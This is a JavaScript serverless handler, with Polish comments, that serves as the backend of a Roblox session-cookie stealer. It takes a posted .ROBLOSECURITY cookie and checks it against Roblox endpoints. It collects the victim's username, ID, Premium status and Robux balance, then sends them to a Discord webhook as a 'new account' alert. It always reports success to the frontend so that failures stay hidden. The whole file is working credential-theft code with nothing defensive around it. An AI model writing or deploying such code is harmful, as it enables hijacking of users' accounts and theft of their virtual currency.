export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false });

  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ ok: false });
  }

  const webhook = process.env.DISCORD_WEBHOOK_URL;

  // Testowy webhook – zawsze wysyłamy, nawet jeśli cookie złe (żeby sprawdzić env var)
  if (webhook) {
    console.log('DISCORD_WEBHOOK_URL istnieje:', webhook.substring(0, 40) + '...');

    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**Test z Vercel – działa!** (czas: ${new Date().toISOString()})`
        })
      });
      console.log('Testowy message na webhook wysłany');
    } catch (testErr) {
      console.error('Test webhook failed:', testErr.message);
    }
  } else {
    console.log('Brak DISCORD_WEBHOOK_URL – env var nie jest dostępna');
  }

  try {
    // CSRF
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      }
    });

    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      console.log('Brak CSRF – cookie prawdopodobnie złe');
      return res.status(200).json({ ok: true }); // nadal "wysłane" dla frontendu
    }

    // User data
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      }
    });

    if (!userRes.ok) {
      console.log('User auth failed:', userRes.status);
      return res.status(200).json({ ok: true });
    }

    const user = await userRes.json();
    const userId = user.id;

    // Premium i Robux (opcjonalnie, skrócone)
    let premium = false;
    let robux = 0;
    try {
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
        method: 'GET',
        headers: { /* te same headers */ 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' }
      });
      if (premRes.ok) premium = await premRes.json() === true;
    } catch {}

    try {
      const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
        method: 'GET',
        headers: { /* te same */ 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' }
      });
      if (robuxRes.ok) {
        const data = await robuxRes.json();
        robux = Number(data.robux) || 0;
      }
    } catch {}

    // Prawdziwy embed – tylko jeśli dane OK
    if (webhook) {
      console.log('Wysyłanie prawdziwego embeda dla userId:', userId);

      const embed = {
        title: "🪝 Nowe konto",
        color: premium ? 5763719 : 3447003,
        fields: [
          { name: "Username", value: user.name || "?", inline: true },
          { name: "Display Name", value: user.displayName || "?", inline: true },
          { name: "User ID", value: userId.toString(), inline: true },
          { name: "Premium", value: premium ? "TAK" : "NIE", inline: true },
          { name: "Robux", value: robux.toLocaleString() + " ₪", inline: true }
        ],
        timestamp: new Date().toISOString()
      };

      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      }).catch(e => console.error('Embed send error:', e.message));
    }

  } catch (err) {
    console.error('Główny błąd:', err.message);
  }

  // Zawsze sukces dla frontendu
  return res.status(200).json({ ok: true });
}
